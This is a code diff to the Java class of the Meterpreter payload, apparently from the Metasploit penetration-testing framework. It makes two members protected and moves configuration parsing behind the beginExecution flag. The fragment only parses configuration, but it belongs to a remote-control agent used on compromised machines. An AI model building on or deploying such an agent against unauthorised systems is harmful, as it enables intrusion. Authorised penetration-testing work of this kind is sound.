@@ -43,12 +43,12 @@ public class Meterpreter {
 
 
     private final TransportList transports = new TransportList();
-    private int ignoreBlocks = 0;
+    protected int ignoreBlocks = 0;
     private byte[] uuid;
     private long sessionExpiry;
 
 
-    private void loadConfiguration(DataInputStream in, OutputStream rawOut, byte[] configuration) throws MalformedURLException {
+    protected void loadConfiguration(DataInputStream in, OutputStream rawOut, byte[] configuration) throws MalformedURLException {
         // socket handle is 4 bytes, followed by exit func, both of
         // which we ignore.
         int csr = 8;
@@ -159,20 +159,6 @@ public class Meterpreter {
      * @throws Exception
      */
     public Meterpreter(DataInputStream in, OutputStream rawOut, boolean loadExtensions, boolean redirectErrors, boolean beginExecution) throws Exception {
-
-        int configLen = in.readInt();
-        byte[] configBytes = new byte[configLen];
-        in.readFully(configBytes);
-
-        loadConfiguration(in, rawOut, configBytes);
-
-        // after the configuration block is a 32 bit integer that tells us
-        // how many stages were wired into the payload. We need to stash this
-        // because in the case of TCP comms, we need to skip this number of
-        // blocks down the track when we reconnect. We have to store this in
-        // the meterpreter class instead of the TCP comms class though
-        this.ignoreBlocks = in.readInt();
-
         this.loadExtensions = loadExtensions;
         this.commandManager = new CommandManager();
         this.channels.add(null); // main communication channel?
@@ -183,7 +169,21 @@ public class Meterpreter {
             errBuffer = null;
             err = System.err;
         }
+
         if (beginExecution) {
+
+            int configLen = in.readInt();
+            byte[] configBytes = new byte[configLen];
+            in.readFully(configBytes);
+            loadConfiguration(in, rawOut, configBytes);
+
+            // after the configuration block is a 32 bit integer that tells us
+            // how many stages were wired into the payload. We need to stash this
+            // because in the case of TCP comms, we need to skip this number of
+            // blocks down the track when we reconnect. We have to store this in
+            // the meterpreter class instead of the TCP comms class though
+            this.ignoreBlocks = in.readInt();
+
             startExecuting();
         }
     }
